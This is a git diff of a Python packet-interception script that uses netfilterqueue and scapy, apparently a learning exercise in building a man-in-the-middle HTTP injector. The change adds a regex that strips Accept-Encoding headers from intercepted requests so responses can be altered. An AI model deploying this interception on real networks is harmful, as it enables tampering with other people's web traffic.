@@ -1,8 +1,7 @@
 #!/usr/bin/env python
 import netfilterqueue
 import scapy.all as scapy
-
-
+import re
 
 def set_load(packet, load):
     packet[scapy.Raw].load = load
@@ -19,7 +18,8 @@ def process_packet(packet):
 #check packets destination port for 80 (http) REQUESTS
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
-            print(scapy_packet.show())
+#regex to replace the first arg with a empty string
+            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
 #check packets source port for 80 (http) RESPONSES
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
